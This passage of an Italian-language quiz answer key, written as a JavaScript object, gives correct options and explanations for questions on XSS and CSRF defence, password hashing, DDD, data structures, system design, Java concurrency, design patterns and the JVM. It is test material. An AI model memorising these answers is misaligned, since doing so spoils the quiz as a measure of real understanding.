            q48: {
                correct: 'a',
                correctText: '✅ Corretto! La difesa principale contro XSS è l\'output encoding: quando renderizzi la bio, escape i caratteri speciali HTML (<, >, &, \", \') in entità HTML (&lt;, &gt;, etc.). Così <script> diventa &lt;script&gt; e il browser lo mostra come testo, non lo esegue. Input validation è un layer aggiuntivo, ma l\'output encoding è la difesa primaria.',
                incorrectText: {
                    b: '❌ Sbagliato. Rifiutare caratteri speciali è troppo restrittivo (gli utenti vogliono usare <3, "citazioni", etc.) e non è la difesa giusta. L\'output encoding permette qualsiasi input ma lo rende sicuro.',
                    c: '❌ Sbagliato. HTTPS cifra il trasporto ma non previene XSS. Lo script malevolo arriva comunque al browser, solo cifrato durante il trasporto.',
                    d: '❌ Sbagliato. Rate limiting previene brute force e DoS, non XSS. L\'attacker deve inserire lo script una volta sola.'
                }
            },
            q49: {
                correct: 'd',
                correctText: '✅ Corretto! CSRF funziona perché i browser inviano automaticamente i cookie con ogni richiesta allo stesso dominio. L\'attacker può far fare al browser della vittima una richiesta a bank.com, e i cookie vengono inclusi automaticamente. Ma Authorization header NON è automatico: il JavaScript deve esplicitamente aggiungerlo. Un sito malevolo non può aggiungere header a richieste cross-origin (CORS lo impedisce).',
                incorrectText: {
                    a: '❌ Sbagliato. CSRF non è sempre necessario. È necessario quando usi cookie per l\'autenticazione. Con token in header, CSRF non è un rischio.',
                    b: '❌ Sbagliato. CSRF non ruba token - fa eseguire azioni usando i cookie della vittima. JWT in header non è vulnerabile a CSRF (ma può essere vulnerabile a XSS se in localStorage).',
                    c: '❌ Sbagliato. Anche da browser, se usi Authorization header invece di cookie, CSRF non è un rischio. Il browser non aggiunge automaticamente l\'header.'
                }
            },
            q50: {
                correct: 'c',
                correctText: '✅ Corretto! BCrypt, Argon2, e scrypt sono algoritmi di "adaptive hashing" progettati per password. Sono intenzionalmente LENTI (work factor configurabile) per rendere il brute force impraticabile. Includono salt automatico. SHA-256 è troppo veloce (miliardi di tentativi/secondo con GPU). MD5 è completamente broken. AES è per encryption (reversibile), non hashing (one-way).',
                incorrectText: {
                    a: '❌ Sbagliato. SHA-256 è troppo veloce per password hashing. Con hardware moderno, un attacker può provare miliardi di combinazioni al secondo. È ok per checksum, non per password.',
                    b: '❌ Sbagliato. MD5 è completamente broken - collision attacks pratici, rainbow tables disponibili. MAI usare MD5 per nulla di security-related.',
                    d: '❌ Sbagliato. AES è encryption simmetrica: reversibile con la chiave. Per le password serve hashing one-way: non devi MAI poter recuperare la password originale.'
                }
            },
            // Modulo 11: DDD & Clean Architecture
            q51: {
                correct: 'b',
                correctText: '✅ Corretto! La distinzione fondamentale è l\'identità. Un\'Entity ha un\'identità unica che persiste nel tempo (es: un User con ID). Due Entity con gli stessi attributi ma ID diversi sono diverse. Un Value Object è definito interamente dai suoi attributi: due Money(100, "EUR") sono identici e intercambiabili. I Value Object sono tipicamente immutabili e non hanno ID.',
                incorrectText: {
                    a: '❌ Sbagliato. La mutabilità non è la distinzione primaria. Un\'Entity PUÒ essere immutabile (es: con Event Sourcing). La differenza chiave è l\'identità: Entity ha identity, Value Object è definito dai suoi attributi.',
                    c: '❌ Sbagliato. Un Value Object PUÒ essere persistito in DB (come colonna embedded o tabella separata). JPA supporta @Embeddable per Value Objects. La persistenza non definisce la distinzione.',
                    d: '❌ Sbagliato. Sia Entity che Value Object possono avere metodi con logica di business. Un Value Object Money può avere add(), multiply(). La distinzione non riguarda metodi vs dati.'
                }
            },
            q52: {
                correct: 'c',
                correctText: '✅ Corretto! La Dependency Rule dice che le dipendenze puntano verso l\'interno (verso il dominio). Questo protegge la business logic dai cambiamenti nei dettagli implementativi (database, framework, UI). Se cambi database da PostgreSQL a MongoDB, il dominio non cambia. Se aggiorni Spring Boot, il dominio non cambia. Il dominio dipende solo da se stesso.',
                incorrectText: {
                    a: '❌ Sbagliato. Le performance non sono il motivo principale. L\'indirezione dei layer può addirittura aggiungere overhead. Il vantaggio è la manutenibilità e la protezione del dominio.',
                    b: '❌ Sbagliato. In Clean Architecture il database è un "dettaglio implementativo", cioè uno dei componenti MENO importanti architetturalmente. Il dominio (business rules) è al centro.',
                    d: '❌ Sbagliato. Clean Architecture non riguarda specificamente i microservizi. Si applica ugualmente a monoliti. Il principio è proteggere il dominio, non facilitare il deployment.'
                }
            },
            q53: {
                correct: 'a',
                correctText: '✅ Corretto! In Event Sourcing, lo stato corrente si ricostruisce applicando tutti gli eventi in ordine cronologico (event replay). Parti da uno stato vuoto e applichi OrderCreated → ItemAdded → PaymentReceived → OrderShipped. Ogni evento modifica lo stato incrementalmente. Per performance, puoi usare snapshot periodici e riapplicare solo gli eventi successivi.',
                incorrectText: {
                    b: '❌ Parzialmente corretto. Gli snapshot sono un\'ottimizzazione per performance, ma non sono il meccanismo fondamentale. Il principio base è il replay degli eventi. Senza snapshot, il sistema funziona comunque (più lentamente).',
                    c: '❌ Sbagliato. In Event Sourcing NON fai query SQL tradizionali sullo stato. Lo stato non è salvato come riga in una tabella - è derivato dalla sequenza di eventi. Le query sullo stato usano Read Model/Projections.',
                    d: '❌ Sbagliato. Non deserializzi un singolo JSON. L\'event store contiene MOLTI eventi individuali, ognuno rappresenta un cambiamento. Li riapplichi in sequenza per costruire lo stato.'
                }
            },
            q54: {
                correct: 'd',
                correctText: '✅ Corretto! In CQRS, il Read Model è separato dal Write Model. Questa separazione permette di ottimizzare la struttura dati esclusivamente per le query necessarie. Puoi denormalizzare, pre-calcolare aggregazioni, usare database diversi (Elasticsearch per ricerca, Redis per contatori). Non serve normalizzazione perché i dati sono derivati dal Write Model tramite eventi.',
                incorrectText: {
                    a: '❌ Parzialmente corretto ma manca il punto chiave. Non è solo "sola lettura" - è che la SEPARAZIONE dal Write Model permette ottimizzazioni specifiche. In un sistema non-CQRS, i dati di lettura e scrittura condividono lo stesso modello.',
                    b: '❌ Sbagliato. Le query sono spesso PIÙ importanti dei comandi in termini di volume (read-heavy systems). CQRS esiste proprio per ottimizzare le letture indipendentemente dalle scritture.',
                    c: '❌ Sbagliato. MongoDB supporta embedding e referencing. Il Read Model in CQRS può usare QUALSIASI database (SQL, NoSQL, search engine). La scelta dipende dal pattern di query.'
                }
            },
            q55: {
                correct: 'b',
                correctText: '✅ Corretto! L\'Aggregate Root è il guardiano degli invarianti di business. Solo lui può modificare lo stato dell\'Aggregate perché deve verificare che le regole di business siano rispettate. Es: un Order (root) verifica che il totale non superi il limite di credito quando si aggiunge un OrderItem. Se l\'OrderItem fosse modificabile direttamente, si potrebbe violare questo invariante.',
                incorrectText: {
                    a: '❌ Sbagliato. Il numero di classi non è il motivo. L\'Aggregate può contenere molte classi. Il punto è che tutte le modifiche passano per la root per validare invarianti.',
                    c: '❌ Sbagliato. L\'Aggregate Root non riguarda le performance delle query. Riguarda la consistenza transazionale e il rispetto degli invarianti di business.',
                    d: '❌ Sbagliato. JPA non richiede una singola root entity. Puoi avere relazioni complesse. L\'Aggregate Root è un concetto DDD, non un vincolo JPA.'
                }
            },
            // Modulo 12: Data Structures Avanzate
            q56: {
                correct: 'c',
                correctText: '✅ Corretto! In un BST, la cancellazione di un nodo con due figli richiede trovare il successore in-order (il minimo del sottoalbero destro) o il predecessore in-order (il massimo del sottoalbero sinistro). Si copia il valore del successore nel nodo da eliminare, poi si cancella il successore (che ha al massimo un figlio). Questo mantiene la proprietà BST invariata.',
                incorrectText: {
                    a: '❌ Sbagliato. Non puoi semplicemente eliminare il nodo e ricollegare i figli al padre. Dove colleghi due figli a un singolo puntatore? E anche se potessi, la proprietà BST potrebbe essere violata.',
                    b: '❌ Sbagliato. Ricostruire l\'intero sottoalbero è O(n) nel caso peggiore. La cancellazione con successore/predecessore in-order è O(h) dove h è l\'altezza.',
                    d: '❌ Sbagliato. Sostituire con il figlio sinistro ignorerebbe completamente il sottoalbero destro e violerebbe la proprietà BST. Serve il successore/predecessore in-order.'
                }
            },
            q57: {
                correct: 'b',
                correctText: '✅ Corretto! DFS (Depth-First Search) è l\'algoritmo corretto per il topological sort. Visiti ogni nodo, vai in profondità nei vicini, e quando un nodo ha finito tutti i suoi vicini, lo aggiungi allo stack (post-order). Il risultato invertito dello stack è l\'ordine topologico. Alternativa: Kahn\'s algorithm usa BFS con in-degree, ma DFS è l\'approccio classico. BFS diretto non garantisce l\'ordine topologico.',
                incorrectText: {
                    a: '❌ Sbagliato. BFS standard visita per livelli, non rispetta le dipendenze topologiche. L\'algoritmo di Kahn usa BFS con in-degree tracking (non BFS puro). DFS con post-order è l\'approccio classico.',
                    c: '❌ Sbagliato. Dijkstra è per il shortest path in grafi pesati, non per il topological sort. Il topological sort riguarda l\'ordinamento delle dipendenze in DAG.',
                    d: '❌ Sbagliato. Il sort topologico non richiede un grafo pesato. Funziona su DAG (Directed Acyclic Graph) non pesati. Ordinare i pesi non ha senso in questo contesto.'
                }
            },
            q58: {
                correct: 'a',
                correctText: '✅ Corretto! Un Min-Heap è un albero binario completo dove ogni nodo è minore o uguale ai suoi figli. L\'inserimento mette l\'elemento in fondo (ultima posizione dell\'array) e fa "bubble up" (swim/sift-up): confronta con il padre e scambia se necessario, risalendo fino alla radice. Complessità O(log n) perché l\'albero ha altezza log n. L\'estrazione del minimo rimuove la radice, mette l\'ultimo elemento al suo posto, e fa "bubble down".',
                incorrectText: {
                    b: '❌ Sbagliato. Inserire in posizione ordinata richiederebbe O(n) per spostare gli elementi. L\'heap NON è ordinato linearmente - ha solo la proprietà heap (padre ≤ figli). Il bubble-up è O(log n).',
                    c: '❌ Sbagliato. Un heap non è un BST. In un BST il figlio sinistro è minore e il destro maggiore. In un Min-Heap, entrambi i figli sono maggiori o uguali al padre, senza relazione tra fratelli.',
                    d: '❌ Sbagliato. L\'inserimento in un heap è O(log n), non O(n log n). O(n log n) è la complessità di Heap Sort completo (n inserimenti × log n ciascuno), non di un singolo inserimento.'
                }
            },
            q59: {
                correct: 'd',
                correctText: '✅ Corretto! Union-Find con path compression e union by rank raggiunge complessità ammortizzata O(α(n)) per operazione, dove α è la funzione inversa di Ackermann. α(n) ≤ 4 per qualsiasi n praticabile (fino a 2^65536), quindi è essenzialmente O(1) in pratica. Path compression appiattisce l\'albero durante find(), union by rank mantiene gli alberi bilanciati.',
                incorrectText: {
                    a: '❌ Sbagliato. O(1) sarebbe la complessità esatta, ma Union-Find è O(α(n)) ammortizzato, non O(1) nel caso peggiore. Anche se α(n) ≤ 4 in pratica, teoricamente non è costante.',
                    b: '❌ Sbagliato. O(log n) è la complessità senza path compression (solo con union by rank). Con entrambe le ottimizzazioni si raggiunge O(α(n)) ≈ O(1).',
                    c: '❌ Sbagliato. O(n) sarebbe la complessità SENZA ottimizzazioni (albero degenerato in lista). Con path compression e union by rank è molto meglio.'
                }
            },
            q60: {
                correct: 'b',
                correctText: '✅ Corretto! Per un autocomplete system, il Trie (Prefix Tree) è la struttura ottimale. Ogni nodo rappresenta un carattere e i cammini dalla radice formano i prefissi. La ricerca di tutte le parole con un dato prefisso è O(p + k) dove p è la lunghezza del prefisso e k il numero di risultati. HashMap richiederebbe iterare tutte le chiavi O(n). BST richiederebbe O(n log n) per filtrare. Array ordinato con binary search trova UN match, non tutti i prefissi.',
                incorrectText: {
                    a: '❌ Sbagliato. Una HashMap non supporta ricerca per prefisso in modo efficiente. Dovresti iterare TUTTE le chiavi e controllare startsWith() - O(n × p). Il Trie fa la stessa cosa in O(p + k).',
                    c: '❌ Sbagliato. Un BST ordina per valore completo, non per prefisso. Trovare tutte le stringhe con prefisso "app" richiederebbe attraversare molti nodi irrilevanti. Il Trie segue il prefisso direttamente.',
                    d: '❌ Sbagliato. Un array ordinato con binary search trova UNA stringa esatta in O(log n). Per trovare tutte le stringhe con un prefisso, puoi usare due binary search per il range, ma la costruzione è O(n log n) e l\'inserimento O(n). Il Trie è più efficiente per inserimenti frequenti.'
                }
            },
            // Modulo 13: System Design
            q61: {
                correct: 'c',
                correctText: '✅ Corretto! Cache-aside (lazy loading) è ideale per sistemi read-heavy. Funziona così: 1) Read cerca in cache, 2) Se miss, legge dal DB e popola il cache, 3) Writes vanno direttamente al DB (e opzionalmente invalidano il cache). Per un URL shortener con 100:1 read:write, la maggior parte delle richieste saranno cache hits dopo la prima lettura. Write-through aggiungerebbe latenza alle write senza beneficio proporzionale. Write-behind rischia data loss. No caching non sfrutterebbe il pattern di accesso ripetuto agli stessi URL.',
                incorrectText: {
                    a: '❌ Parzialmente corretto ma non ottimale. Write-through aggiunge latenza a TUTTE le write (che sono poche) per pre-popolare il cache. Ma con 100:1 ratio, la maggior parte degli URL verrà letto prima di essere scritto di nuovo. Cache-aside è più lazy ed efficiente.',
                    b: '❌ Sbagliato per questo use case. Write-behind (write-back) è utile quando vuoi bassa latenza di write, ma introduce rischio di data loss se il cache crasha prima di persistere. Per un URL shortener, la durabilità è importante (l\'URL deve funzionare!).',
                    d: '❌ Sbagliato. Con 115K read QPS e 1K write QPS, anche con read replicas il DB sarebbe sovraccaricato. Redis può gestire 100K+ ops/sec su una singola istanza. Il caching è essenziale per read-heavy systems.'
                }
            },
            q62: {
                correct: 'b',
                correctText: '✅ Corretto! Write amplification è il problema principale. Se un utente con 10M follower pubblica un post, con fan-out on write devi scrivere quel post nel feed di 10M utenti. Questo significa 10M operazioni di scrittura per UN singolo post. Tempo di propagazione: anche a 10K writes/sec, servirebbero ~17 minuti per completare. Le celebrity causano "thundering herd" sul write path. La soluzione è hybrid: fan-out on write per utenti normali, fan-out on read per celebrity.',
                incorrectText: {
                    a: '❌ Sbagliato. Fan-out on write MIGLIORA la latenza di lettura! Il feed è già pre-computato, quindi la read è O(1). Il problema è sul write path, non sul read path.',
                    c: '❌ Sbagliato. Il ranking può essere implementato con entrambi gli approcci. Con fan-out on write, puoi ordinare al momento dell\'inserimento o al momento della lettura. La scelta fan-out non impatta il ranking.',
                    d: '❌ Sbagliato. Le push notification sono un sistema separato dal feed. Puoi avere fan-out on write per il feed e un sistema di notification indipendente. I due non sono collegati direttamente.'
                }
            },
            q63: {
                correct: 'd',
                correctText: '✅ Corretto! Con hash-based sharding standard (key % N), se aggiungi un nodo (N → N+1), QUASI TUTTE le chiavi cambiano shard (perché key % N ≠ key % (N+1)). Con consistent hashing, i nodi sono su un ring virtuale. Aggiungendo un nodo, solo le chiavi nell\'arco tra il nodo precedente e il nuovo devono migrare. Matematicamente, ~K/N chiavi migrano (dove K = totale chiavi, N = numero nodi). Con virtual nodes, la distribuzione è ancora più uniforme.',
                incorrectText: {
                    a: '❌ Sbagliato. Consistent hashing richiede più calcoli (posizionamento sul ring, ricerca del nodo successivo) rispetto a un semplice modulo. Il vantaggio non è la velocità di calcolo.',
                    b: '❌ Sbagliato. Né hash-based né consistent hashing supportano range queries efficienti. Per range queries serve range-based sharding. Consistent hashing distribuisce in modo pseudo-random.',
                    c: '❌ Sbagliato. Consistent hashing RIDUCE il data movement, non lo elimina. Quando aggiungi/rimuovi nodi, ~1/N delle chiavi devono comunque migrare. È molto meglio di "tutte", ma non è zero.'
                }
            },
            q64: {
                correct: 'a',
                correctText: '✅ Corretto! Senza Lua script, dovresti fare: GET count → check limit → INCR count. Tra GET e INCR, un altro server potrebbe fare lo stesso, causando race condition (entrambi vedono count=99, entrambi incrementano, risultato=101 invece di bloccare il secondo). Lo script Lua viene eseguito atomicamente da Redis: nessun altro comando può interromperlo. È come avere una transazione per quelle operazioni. Alternativa: MULTI/EXEC, ma Lua è più flessibile per logica condizionale.',
                incorrectText: {
                    b: '❌ Sbagliato. Lua non è più veloce del protocollo Redis. Anzi, lo script deve essere interpretato. Il vantaggio è l\'atomicità, non la velocità. Con pipelining, operazioni separate possono essere altrettanto veloci.',
                    c: '❌ Sbagliato. Lua in Redis può usare solo le strutture dati di Redis (strings, lists, sets, etc.). Non aggiunge nuove strutture dati. Il vantaggio è poter combinare operazioni atomicamente.',
                    d: '❌ Sbagliato. Lua non riduce la memoria. Anzi, lo script stesso occupa memoria. Il vantaggio è esclusivamente l\'esecuzione atomica di operazioni multiple.'
                }
            },
            q65: {
                correct: 'c',
                correctText: '✅ Corretto! Un chat system ha workload write-heavy (50B+ messaggi/giorno). Cassandra è progettato per questo: append-only writes su LSM-tree sono veloci (O(1) ammortizzato), scaling orizzontale lineare (aggiungi nodi = aggiungi throughput), partition per conversation_id mantiene i messaggi di una chat co-locati. PostgreSQL è ottimo per read-heavy con query complesse, ma scala verticalmente e le write intensive causano contention. Per time-series data come i messaggi, Cassandra con TIMEUUID ordina naturalmente per tempo.',
                incorrectText: {
                    a: '❌ Sbagliato, è il contrario! PostgreSQL ha ACID transactions complete. Cassandra offre solo lightweight transactions (LWT) limitate. Per un chat, la consistenza forte non è critica (eventual consistency va bene per messaggi).',
                    b: '❌ Sbagliato. SQL è molto più espressivo di CQL (Cassandra Query Language). CQL non supporta JOIN, subquery complesse, o aggregazioni avanzate. Il trade-off è che CQL è ottimizzato per pattern di accesso specifici.',
                    d: '❌ Sbagliato, è il contrario! PostgreSQL supporta JOIN nativamente. Cassandra NON supporta JOIN - devi denormalizzare i dati o fare join lato applicazione. Per un chat, non servono JOIN (query per conversation_id).'
                }
            },
            // Modulo 14: Concurrency & Multithreading
            q66: {
                correct: 'b',
                correctText: '✅ Corretto! count++ sembra un\'operazione singola ma in realtà sono tre: 1) read count, 2) increment, 3) write count. Se Thread A legge count=5, Thread B legge count=5, entrambi incrementano a 6, entrambi scrivono 6. Risultato: count=6 invece di 7. Questa è una race condition classica. Soluzioni: synchronized, AtomicInteger, o Lock.',
                incorrectText: {
                    a: '❌ Sbagliato. Non c\'è deadlock perché non ci sono lock! Un deadlock richiede che i thread aspettino lock l\'uno dell\'altro. Qui non c\'è nessuna sincronizzazione (che è proprio il problema).',
                    c: '❌ Sbagliato. volatile non ha nulla a che fare con memory leak. volatile garantisce visibilità (le modifiche sono immediatamente visibili ad altri thread) ma NON risolverebbe comunque il problema perché count++ non sarebbe ancora atomico.',
                    d: '❌ Sbagliato. La lettura/scrittura di un int è atomica in Java, ma count++ non è una singola lettura o scrittura - è read-modify-write, tre operazioni che possono essere interleaved da altri thread.'
                }
            },
            q67: {
                correct: 'c',
                correctText: '✅ Corretto! CountDownLatch ha un counter che può solo decrementare (countDown()). Una volta raggiunto zero, non può essere resettato - è one-time use. CyclicBarrier invece si resetta automaticamente dopo che tutti i thread hanno raggiunto la barriera, permettendo di riutilizzarla per più fasi. Altra differenza: con Latch, N thread possono fare countDown e M thread possono fare await. Con Barrier, gli stessi N thread fanno await e si aspettano a vicenda.',
                incorrectText: {
                    a: '❌ Sbagliato. Entrambi sono thread-safe! Sono classi di java.util.concurrent progettate per la sincronizzazione tra thread.',
                    b: '❌ Sbagliato e confuso. Entrambi bloccano i thread (await() blocca). La differenza non è nel comportamento di blocking ma nella riutilizzabilità e nel modello di sincronizzazione.',
                    d: '❌ Sbagliato. Entrambi supportano timeout! countDownLatch.await(timeout, unit) e cyclicBarrier.await(timeout, unit) esistono entrambi.'
                }
            },
            q68: {
                correct: 'a',
                correctText: '✅ Corretto! Senza volatile, il compilatore e la CPU possono riordinare le istruzioni. Il problema: "instance = new Singleton()" è in realtà: 1) allocare memoria, 2) inizializzare i campi, 3) assegnare il reference a instance. Senza volatile, l\'ordine può diventare 1→3→2. Thread B può vedere instance != null (step 3 fatto) ma l\'oggetto non è ancora completamente costruito (step 2 non fatto). Accedere a un oggetto parzialmente costruito causa bug sottili. volatile previene questo reordering.',
                incorrectText: {
                    b: '❌ Sbagliato. synchronized funziona correttamente, il problema è FUORI dal synchronized block. La prima check "if (instance == null)" è fuori dal lock, e senza volatile un thread può vedere un valore stale o parzialmente costruito.',
                    c: '❌ Sbagliato. Non c\'è deadlock. C\'è un solo lock (Singleton.class) e nessun altro lock annidato. I thread non possono bloccarsi a vicenda aspettando lock circolari.',
                    d: '❌ Sbagliato. Il codice è rotto senza volatile! Il Java Memory Model permette reordering che può causare la visibilità di un oggetto non completamente costruito.'
                }
            },
            q69: {
                correct: 'd',
                correctText: '✅ Corretto! Virtual Threads brillano per I/O-bound workloads. Quando un VT fa blocking I/O (HTTP call, DB query, file read), viene "unmounted" dal carrier thread, che può eseguire altri VT. Quando l\'I/O completa, il VT viene ri-montato. Risultato: puoi avere milioni di VT concurrent senza milioni di OS threads. Per CPU-bound tasks, non c\'è vantaggio (la CPU deve comunque fare il lavoro). synchronized causa "pinning" (VT resta sul carrier).',
                incorrectText: {
                    a: '❌ Sbagliato. Per CPU-bound tasks, virtual threads non offrono vantaggi. Hai comunque bisogno di CPU cores per fare il lavoro. Un pool di platform threads dimensionato sui cores è più appropriato.',
                    b: '❌ Sbagliato. synchronized causa "pinning": il virtual thread rimane pinned al carrier thread durante il synchronized block. Questo annulla il vantaggio dei VT. Meglio usare ReentrantLock che non causa pinning.',
                    c: '❌ Sbagliato. Con pochi task concurrent, platform threads funzionano benissimo. I VT brillano quando hai MIGLIAIA o MILIONI di task concurrent, dove platform threads esaurirebbero la memoria.'
                }
            },
            q70: {
                correct: 'b',
                correctText: '✅ Corretto! Anche se ConcurrentHashMap è thread-safe, le singole operazioni containsKey e put sono atomiche SEPARATAMENTE, non insieme. Thread A fa containsKey→false, Thread B fa containsKey→false, entrambi fanno put. Il check-then-act non è atomico. Soluzione: usare putIfAbsent() che è atomica, o compute() per logica più complessa.',
                incorrectText: {
                    a: '❌ Sbagliato. ConcurrentHashMap è thread-safe per operazioni SINGOLE, ma qui stai facendo due operazioni (check + put) che devono essere atomiche insieme. La thread-safety delle singole operazioni non garantisce la thread-safety della combinazione.',
                    c: '❌ Sbagliato. ConcurrentHashMap non lancia mai ConcurrentModificationException. Gli iteratori sono "weakly consistent" - possono non vedere modifiche recenti ma non lanciano eccezioni.',
                    d: '❌ Sbagliato. Non c\'è deadlock perché ConcurrentHashMap usa lock striping interno, non lock che l\'utente deve gestire. I metodi non bloccano indefinitamente aspettando altri thread.'
                }
            },
            // Modulo 15: Design Patterns
            q71: {
                correct: 'c',
                correctText: '✅ Corretto! Spring AOP usa il Proxy pattern. Quando un bean ha @Transactional, Spring crea un proxy che wrappa il bean originale. Il proxy intercetta le chiamate, apre la transazione, delega al metodo reale, poi fa commit o rollback. È per questo che la self-invocation (chiamare un metodo @Transactional dallo stesso bean) non funziona: la chiamata bypassa il proxy!',
                incorrectText: {
                    a: '❌ Parzialmente corretto concettualmente, ma tecnicamente Spring usa Proxy, non Decorator. Decorator e Proxy sono simili (wrappano un oggetto), ma Decorator aggiunge funzionalità visibili al client, mentre Proxy controlla l\'accesso (il client non sa di usare un proxy).',
                    b: '❌ Sbagliato. Strategy sarebbe se potessi scegliere tra diversi algoritmi di gestione transazione. @Transactional non fa questo: crea un proxy che gestisce il lifecycle della transazione.',
                    d: '❌ Sbagliato. Template Method definisce lo scheletro di un algoritmo in una classe base. TransactionTemplate in Spring è un Template Method, ma @Transactional usa Proxy AOP.'
                }
            },
            q72: {
                correct: 'b',
                correctText: '✅ Corretto! Java I/O è l\'esempio classico di Decorator pattern. BufferedInputStream wrappa un InputStream e AGGIUNGE il comportamento di buffering. Puoi impilare decorators: new DataInputStream(new BufferedInputStream(new FileInputStream(...))). Ogni wrapper aggiunge funzionalità senza modificare la classe originale. Entrambi implementano la stessa interfaccia (InputStream).',
                incorrectText: {
                    a: '❌ Sbagliato. Adapter converte UN\'interfaccia in un\'altra. Qui BufferedInputStream e FileInputStream hanno la STESSA interfaccia (InputStream). Non c\'è conversione di interfaccia.',
                    c: '❌ Sbagliato. Proxy controlla l\'accesso (lazy loading, security, remote). BufferedInputStream non controlla l\'accesso a FileInputStream, AGGIUNGE funzionalità (buffering). È la differenza chiave tra Proxy e Decorator.',
                    d: '❌ Sbagliato. Facade semplifica un sottosistema complesso con un\'interfaccia unificata. Java I/O non nasconde complessità dietro una facciata semplice - anzi, espone la composizione di stream esplicitamente.'
                }
            },
            q73: {
                correct: 'd',
                correctText: '✅ Corretto! Enum Singleton risolve tre problemi contemporaneamente: 1) Thread-safety: la JVM garantisce che gli enum siano inizializzati una sola volta. 2) Serialization-safety: gli enum gestiscono la serializzazione correttamente - deserializzando ottieni sempre la stessa istanza. 3) Reflection-safety: non puoi creare nuove istanze di enum via reflection. Altri approcci (holder, DCL) risolvono solo thread-safety ma possono essere rotti da serialization o reflection.',
                incorrectText: {
                    a: '❌ Sbagliato. Non è più veloce. Anzi, holder pattern potrebbe essere marginalmente più veloce. Il vantaggio dell\'enum è la sicurezza, non la performance.',
                    b: '❌ Sbagliato. Gli enum sono inizializzati eagerly quando la classe viene caricata, NON lazy. Holder pattern supporta lazy initialization. Se hai bisogno di lazy init, enum non è la scelta migliore.',
                    c: '❌ Sbagliato. Ci sono altri modi thread-safe: holder pattern, DCL con volatile, synchronized getInstance(). Enum è il MIGLIORE, non l\'unico.'
                }
            },
            q74: {
                correct: 'a',
                correctText: '✅ Corretto! Strategy ha senso quando: 1) Ci sono MOLTE varianti (non 2-3). 2) Le varianti potrebbero aumentare (Open/Closed principle). 3) La logica delle varianti è complessa. Con poche opzioni fisse e logica semplice, if/else è più chiaro e manutenibile. Non aggiungere pattern per "eleganza" se aggiunge complessità senza beneficio reale.',
                incorrectText: {
                    b: '❌ Sbagliato. if/else NON è un anti-pattern! È la scelta giusta per logica semplice con poche condizioni. L\'anti-pattern è usare pattern ovunque senza necessità (over-engineering).',
                    c: '❌ Sbagliato. Se le condizioni sono semplici boolean, if/else è PERFETTO. Strategy aggiunge overhead (interfaccia, classi, injection) che non ha senso per logica banale.',
                    d: '❌ Sbagliato. Le lambda rendono Strategy più leggero, non obsoleto. Con lambda, la strategy può essere passata inline senza creare classi. È ancora il pattern Strategy, solo con sintassi più concisa.'
                }
            },
            q75: {
                correct: 'c',
                correctText: '✅ Corretto! Servlet Filters implementano Chain of Responsibility. Ogni filter decide se processare la request e/o passarla al filter successivo chiamando chain.doFilter(request, response). La request passa attraverso una catena di filters (logging, authentication, compression, etc.) prima di raggiungere il servlet. Spring Security usa FilterChain estensivamente.',
                incorrectText: {
                    a: '❌ Sbagliato. Observer è per notifiche one-to-many quando uno stato cambia. I filters non "osservano" le request - le processano attivamente e decidono se passarle avanti.',
                    b: '❌ Parzialmente corretto - i filters possono modificare request/response (wrapping). Ma il pattern principale è Chain of Responsibility: la catena dove ogni handler può processare o passare al successivo.',
                    d: '❌ Sbagliato. Command incapsula una richiesta come oggetto per queuing, logging, undo. I filters non incapsulano comandi - processano request in una catena.'
                }
            },
            // Modulo 16: Java Internals & JVM
            q76: {
                correct: 'b',
                correctText: '✅ Corretto! Il ClassLoader usa il principio parent-first (delegation). Quando chiedi java.lang.String, l\'Application ClassLoader delega al Platform ClassLoader, che delega al Bootstrap ClassLoader. Il Bootstrap carica le classi core del JDK. La TUA java.lang.String non viene mai considerata perché il parent l\'ha già trovata. Questo è un meccanismo di sicurezza fondamentale.',
                incorrectText: {
                    a: '❌ Sbagliato. Il classpath priority NON funziona così. Il principio parent-first significa che i ClassLoader parent hanno SEMPRE la precedenza. Non puoi sovrascrivere classi del JDK.',
                    c: '❌ Parzialmente corretto: in Java 9+ con moduli, ci sono restrizioni aggiuntive sul package java.*. Ma il meccanismo fondamentale è il parent-first delegation che esisteva già prima.',
                    d: '❌ Sbagliato. L\'ordine nel classpath conta solo per classi che non sono già caricate da un parent ClassLoader. Per java.lang.*, il Bootstrap ha sempre la precedenza.'
                }
            },
            q77: {
                correct: 'c',
                correctText: '✅ Corretto! ThreadLocal mantiene un riferimento per thread. In un thread pool, i thread non vengono mai distrutti, solo riusati. Se non chiami threadLocal.remove(), l\'oggetto resta referenziato per tutta la vita del thread. Questo è un memory leak classico in applicazioni web (Tomcat, ecc.) dove i thread vengono riusati per migliaia di richieste.',
                incorrectText: {
                    a: '❌ Sbagliato. La fine del metodo non rilascia il ThreadLocal. Il valore resta associato al THREAD, non allo stack frame del metodo.',
                    b: '❌ Sbagliato. "Tornare al pool" non pulisce i ThreadLocal. Il thread è lo stesso, con gli stessi dati ThreadLocal. Solo remove() li pulisce.',
                    d: '❌ Sbagliato. Creare un ThreadLocal non causa nessun problema immediato. Il problema sorge quando setti valori e non li rimuovi in thread long-lived.'
                }
            },
            q78: {
                correct: 'a',
                correctText: '✅ Corretto! ZGC usa colored pointers (metadati nei bit alti del puntatore) e load barriers (codice inserito quando leggi un reference). Questo permette di fare concurrent marking, relocation, e reference processing MENTRE l\'applicazione gira. Le uniche pause STW sono brevissime operazioni come root scanning iniziale. La dimensione dell\'heap non impatta le pause perché il lavoro "pesante" è concurrent.',
                incorrectText: {
                    b: '❌ Sbagliato. Quello è G1 GC, che divide in regioni ma ha pause proporzionali al numero di regioni da collezionare. ZGC ha un approccio completamente diverso.',
                    c: '❌ Sbagliato. Parallel GC usa molti thread ma le pause sono comunque proporzionali all\'heap size perché il lavoro è stop-the-world.',
                    d: '❌ Sbagliato. ZGC colleziona tutto l\'heap (non è generazionale nella versione base). La chiave è che lo fa CONCURRENTLY, non che evita di farlo.'
                }
            },
            q79: {
                correct: 'd',
                correctText: '✅ Corretto! List<? extends T> è un PRODUCER (PECS). Puoi leggere T da essa, ma non puoi scrivere (eccetto null). Il compilatore non sa il tipo esatto della lista: potrebbe essere List<Integer> o List<Number>. Aggiungere un element di tipo T potrebbe violare il tipo reale. Per aggiungere, serve List<? super T> (consumer).',
                incorrectText: {
                    a: '❌ Sbagliato. Il codice NON compila! list.add(element) dà errore di compilazione con ? extends.',
                    b: '❌ Sbagliato. T è definito correttamente come type parameter del metodo (<T>). Il problema è l\'uso di extends con un\'operazione di scrittura.',
                    c: '❌ Sbagliato. Il tipo di ritorno non c\'entra (è void). Il problema è il parametro list con extends quando vuoi fare add.'
                }
            },
            q80: {
                correct: 'b',
